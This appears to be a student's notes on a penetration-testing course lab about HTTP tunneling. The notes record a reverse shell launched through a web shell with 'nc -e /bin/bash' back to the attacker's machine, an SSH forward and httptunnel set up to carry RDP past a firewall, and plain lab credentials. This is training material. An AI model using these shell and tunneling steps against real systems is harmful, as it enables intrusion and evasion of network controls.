# 20.5.1.1

## 20.5.1.1.1. Connect to your dedicated Linux lab client as the student account using **rdesktop** and run the **http_tunneling.sh** script from **/root/port_forwading_and_tunneling** as root

Log into Debian as student
```plaintext
kali@kali:~$ rdesktop 192.168.214.44 -u student -p lab
Autoselecting keyboard map 'en-us' from locale
Connection established using plain RDP.
Sound(warning): rdpsnd_process_packet(), Unhandled opcode 0x27
Clipboard(error): xclip_handle_SelectionNotify(), unable to find a textual target to satisfy RDP clipboard text request
```

Change to root user and run http_tunneling.sh
```plaintext
student@debian:~$ su
Password: 
root@debian:/home/student# /root/port_forwarding_and_tunneling/

## 20.5.1.1.2. Start the *apache2* service and exploit the vulnerable web application hosted on port 443 (covered in a previous module) in order to get a reverse HTTP shell.

Start the apache2 service
```plaintext
root@debian:/home/student# systemctl start apache2
root@debian:/home/student# 
```

Run the exploit from 15.2.4.1.4:

Open a netcat listener on Kali
```plaintext
kali@kali:~$ sudo nc -lnvp 4444
[sudo] password for kali: 
listening on [any] 4444 ...
```

Run a netcat cmd on the exploit to connect to our Kali machine.
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/15_fixingExploits/cms$ curl -k https://192.168.214.44/uploads/shell.php?cmd=nc+-nv+192.168.119.214+4444+-e+/bin/bash
```

Notice we have a shell

## 20.5.1.1.3. Replicate the scenario demonstrated above using your dedicated clients.

Ensure that 'httptunnel' has been installed onto the Kali machine
```plaintext
kali@kali:~$ sudo apt install httptunnel
```

### Using the shell we caught for the Debian machine, create a local forward from it (127.0.0.1) and log in as student. We forward all requests on port 8888(0.0.0.0:8888) to the Windows Server's remote desktop port (172.16.214.5:3389)
`ssh -L 0.0.0.0:8888:172.16.214.5:3389 student@127.0.0.1`
![b8bee8a5f52cf51d3813e00e667addcd.png](:/db324dec5d044a8aabff091637bab747)

Verify that you're listening on port 8888

### Still from the Debian client, create an HTTPTunnel out to our Kali Linux machine so that we can slip traffic past the HTTP-only protocol restriction.
`hts --forward-port localhost:8888 1234`
![b9af51816cb3976f207ffb881f1a90ad.png](:/e07d8700274f4c1b8208bc529be0d4f0)

Confirm that the HTTPTunnel server is up and running using ps and ss
`ps aux | grep hts`
![fddd82d99084c45ba7ced09b1518ee0b.png](:/37ef05b0749c452089a0cab158ac705d)
`ss -antp | grep "1234"`
![4e1ea4dd0c6f03e8d2c92bdb2838f24e.png](:/3307dd5d77114c829a4e5b50e9ecbf13)

### Create an HTTPTunnel client that takes our remote desktop traffic, encapsulates it into an HTTP stream, and sends it to the listening HTTPTunnel server.

Listen on localhost port 8080 (--forward-port 8080), HTTP-encapsulate the traffic, and forward it across the firewall to our listening HTTPTunnel server port on port 1234
`htc --forward-port 8080 192.168.214.44:1234`

Verify the HTTPTunnel client it working
`ps aux | grep htc`
`ss -antp | grep "8080"`
![4ee6d45f19eaec4f2b12156bd1e33d86.png](:/9ab80d1f25af449d8a1f051728cd4a9e)

Now, all traffic sent to TCP port 8080 on our Kali Linux machine will be redirected into our HTTPTunnel (where it is HTTP-encapsulated, sent across the firewall to the compromised Linux server and decapsulated) and redirected again to the Windows Server’s remote desktop service.

Open Wireshark and sniff the traffic to validate this is HTTP-encapsulated



Test to see if we get redirected to the Windows Sever's remote desktop service
`rdesktop 127.0.0.1:8080`
![bfb65ffbeddedf56caba07a10a17fd4b.png](:/9a9401e586d34c4ea445db5c2260a18c)
We get the Windows Server remote desktop

Sign into the Windows Server as corp\administrator, password: lab

We are on the Windows Server 2016 desktop

We confirm on Wireshark -> interface: tun0 -> display filter: host 192.18.119.214 (Kali)
Here we see that the traffic goes to and from Kali to Debian client
